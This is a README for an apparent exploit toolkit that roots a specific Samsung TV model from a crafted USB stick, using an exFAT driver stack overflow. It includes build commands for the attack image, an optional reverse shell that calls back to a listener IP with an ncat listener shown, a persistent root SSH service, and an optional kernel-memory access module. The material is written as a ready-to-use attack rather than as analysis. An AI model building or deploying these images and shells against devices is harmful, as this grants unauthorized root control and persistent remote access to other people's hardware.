# samsung-tv-usb-root

One-plug USB root for the Samsung 2019 Muse.M platform, developed and physically
validated on:

```text
Model:    GQ65Q70RGTXZG
Firmware: T-MSMDEUC 1500.9
Kernel:   Linux 4.1.10 ARMv7
```

The USB has two partitions:

1. a from-scratch exFAT filesystem whose crafted `num_ext` entry triggers the
   shipped Samsung exFAT driver's stack overflow;
2. a normal FAT16 payload partition containing a static dropbear, host keys,
   authorized keys, and an idempotent bootstrap script.

The kernel chain is calibration-free: it uses an untouched runtime `ip`
pointer, copies a stage into an unreferenced fixed core-text cave, flushes the
cache, patches Samsung UEP, invokes signed Bash, then parks the corrupted task
with `schedule_timeout_uninterruptible(LONG_MAX)`. No UART, Developer Mode,
pairing, device-specific stack address, bind mount, `/root` write, firmware
rewrite, or module padding is required.

## Status

Physically verified on the TV above:

```text
interactive Bash: uid=0(root)
dropbear-root.service: active (Restart=always)
0.0.0.0:22: LISTEN
operator key 1: accepted
operator key 2: accepted
```

The QEMU lab independently verifies p1 mount/trigger, cave copy, cache flush,
UMH, p2 bootstrap, and a listening dropbear with the shipped exFAT modules.
The dev shell supplies GNU ARM binutils, ROPgadget, ropper, Capstone and
pwntools; exploit constants are derived from the shipped target artifacts.

**Do not use this on a different model or firmware. Every address in the
`tv` profile is specific to T-MSMDEUC 1500.9. A mismatch can hang or reboot the
TV. Use only on hardware you own.**

## Build a stick

NixOS/Linux:

```sh
nix run . -- \
  --exploit-profile tv \
  --authorized-keys ~/.ssh/id_ed25519.pub \
  --out out/tv-usb-root.img --force
```

Optional interactive reverse shell to a listener you control:

```sh
nix run . -- \
  --exploit-profile tv \
  --beacon LISTENER_IP:4444 \
  --authorized-keys ~/.ssh/id_ed25519.pub \
  --extra-authorized-keys another-operator.pub \
  --out out/tv-usb-root.img --force
```

Listen with:

```sh
ncat -lv 4444
```

The reverse shell is a real interactive root Bash (`bash -i`, stdin/stdout/
stderr on the TCP connection). It runs in the background so bootstrap and p1
detachment are never blocked by the interactive session. `--beacon` is optional
and has no default IP. Without it, the bootstrap runs stage1 directly.

Flash (destroys the selected device):

```sh
sudo dd if=out/tv-usb-root.img of=/dev/sdX bs=4M conv=fsync status=progress
sync
```

Power-cycle the TV with the stick inserted. Then:

```sh
ssh -i ~/.ssh/id_ed25519 root@TV_IP
```

## Reboot-safe, idempotent lifecycle

Persistent data lives only under `/opt`:

```text
/opt/bin/dropbearmulti
/opt/etc/dropbear/authorized_keys
/opt/etc/dropbear/dropbear_host_ed25519
/opt/etc/dropbear/dropbear_host_rsa
```

Each exploit boot:

1. waits for physical p2 at `/opt/media/USBDriveA2`;
2. atomically acquires `/tmp/.samsung-usb-rooted` so racing media workers exit;
3. immediately lazy-unmounts only p1 (`USBDriveA1`);
4. atomically updates only files whose hashes changed;
5. preserves existing host keys;
6. recreates `/run/systemd/system/dropbear-root.service` and verifies it.

The USB device and p2 remain present. The stick is never modified by the TV.
On reboot `/tmp` disappears and still-armed p1 repeats the same idempotent
bootstrap.

## Optional research `/dev/kmem`

Stock firmware has both `CONFIG_DEVMEM=n` and `CONFIG_DEVKMEM=n`. To include a
root-only research device:

```sh
nix run . -- \
  --exploit-profile tv \
  --research-kmem \
  --authorized-keys ~/.ssh/id_ed25519.pub \
  --out out/tv-usb-research.img --force
```

This adds `research_kmem.ko`, loaded with `enable=1`, creating `/dev/kmem` mode
0600. It uses `probe_kernel_read/write` and flushes the ARM instruction cache
after writes. The default image does not include or load it.

## Rebuild the static dropbear

The checked-in binary is static ARM EABI5 soft-float. Root's key allowlist is
patched to `/opt/etc/dropbear/authorized_keys` because `/root` is on the
read-only VDFS rootfs.

```sh
nix build .#dropbear-tv
install -m755 result/bin/dropbearmulti payload/dropbearmulti
```

This uses a pinned Nix soft-float musl cross toolchain and pinned Dropbear
source—no external toolchain, container, or source checkout. `nix run` consumes
the derivation directly. See `payload/README-BUILD.md` and
`payload/dropbear-authorized-keys-opt.patch`.

## Repository layout

```text
tools/                 image, trigger, cave, kernel-stage and ksymtab builders
payload/               dropbear patch/binary and optional research_kmem module
lab/                   vendor-kernel/QEMU lab (firmware and GPL source omitted)
research/findings/      exFAT/ext4/NTFS and CEC analysis
research/lab-lanes/     reproducible lane scripts/shims (no images/logs)
research/ghidra/        target-specific Ghidra scripts
docs/                   provenance, post-exploitation and operator notes
```

## Public prerequisites not included

This repository intentionally contains no Samsung firmware, decrypted images,
shipped proprietary modules, device certificates, keys, or live device dump.
To recreate the lab, provide your legally obtained firmware artifacts and the
Samsung GPL Linux source tree as documented in `lab/README.md`.

## License

Original project code is AGPL-3.0-only. The kernel module is separately
dual-licensed `GPL-2.0-only OR AGPL-3.0-only` so it can use GPL-only kernel
symbols. Dropbear and musl retain their upstream licenses; see `LICENSES/`.
